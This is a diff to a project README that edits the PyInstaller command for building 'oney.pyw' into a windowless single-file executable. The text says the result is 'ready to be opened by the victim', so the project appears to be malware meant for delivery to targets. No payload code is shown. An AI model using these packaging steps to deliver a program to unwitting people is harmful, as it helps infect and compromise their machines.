@@ -152,7 +152,9 @@ Edit python file:
 ```
 pip install pyinstaller
 
-pyinstaller --onefile --windowed --icon=assets/icon.ico oney.pyw
+pyinstaller --onefile --windowed oney.pyw
+
+# you can add --icon=assets/icon.ico before oney.pyw for a custom icon.
 ```
 This will generate a .exe file in the dist folder ready to be opened by the victim, no requirements or python needed to open it.
 
